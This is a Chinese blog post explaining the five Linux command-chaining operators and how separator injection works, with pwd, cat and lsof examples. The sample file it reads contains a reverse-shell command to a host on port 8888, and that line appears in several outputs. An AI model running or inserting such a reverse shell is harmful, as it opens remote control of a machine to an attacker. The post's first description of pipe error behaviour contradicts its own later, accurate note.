ailx10说：这篇是我2023年8月写的。几个命令拼接符看着只有一两个字符，结果却能把执行顺序变得完全不同。我就拿 pwd 和读文件这些小例子，分别试管道、逻辑或、分号、后台和逻辑且，再顺手用 lsof 管道筛监听端口。把它们并排跑一遍，比只抄五个符号更容易留住印象。文章不大，来源也是写命令时想把这些习惯弄准确：前一条失败后还走不走，数据传到哪儿，进程有没有等完，终端里短短一行其实藏着不少安排。

---

Linux多命令顺序执行符号需要记住5个 【`｜`】【`||`】【 `;`】 【`&`】 【`&&`】 ，在命令执行里面，如果服务器疏忽大意没做限制，黑客通过高命令拼接符，可以输入很多非法的操作。

【`｜`】管道符，前面的输出，作为后面的输入，前面后面出错，语句都会出错

```
pwd | cat index.html 



bash -i >& /dev/tcp/192.168.0.101/8888 0>&1
```

【`||`】前面的执行成功，后面的不会程序，前面的执行失败，后面的会执行

```
pwd || cat index.html



/Users/ailx10
```

【 `;`】分号，前后没有任何逻辑关系，不管是否正确，都会一直执行下去

```
pwd ; cat index.html



/Users/ailx10

bash -i >& /dev/tcp/192.168.0.101/8888 0>&1
```

【`&`】前面在后台跑，然后执行后面的程序

```
pwd & cat index.html



[1] 20284

/Users/ailx10

[1]  + done       pwd

bash -i >& /dev/tcp/192.168.0.101/8888 0>&1
```

【`&&`】前面的执行成功，才会执行后面的，前面的执行不成功，后面的不会执行

```
pwd && cat index.html



/Users/ailx10

bash -i >& /dev/tcp/192.168.0.101/8888 0>&1
```

举个例子，在Mac/Linux 系统中，我不知道哪个端口在对外提供服务，我该如何找到它？那么就可以使用管道符【`|`】，将左边的查询结果，传递给右边的筛选命令，最后输出我们想要的结果。 这里很轻松的发现我的Mac电脑开启了一个Web服务，端口是7777，并且是Python程序起的服务。

```
sudo lsof -i -P | grep LISTEN
```

![](/notes-assets/0914c145b127e0ee435b.webp)

在默认 Bash 行为下，管道的退出状态取最后一个命令的退出状态；前面某个命令失败，不代表整条管道必然报告失败。开启 pipefail 后，退出状态的规则才会改变。

管道不是让所有命令一起成功，后面的程序也未必消费前面的输出。把这些语义弄清，遇到复杂拼接时就能推演，而不必凭符号长相猜结果。
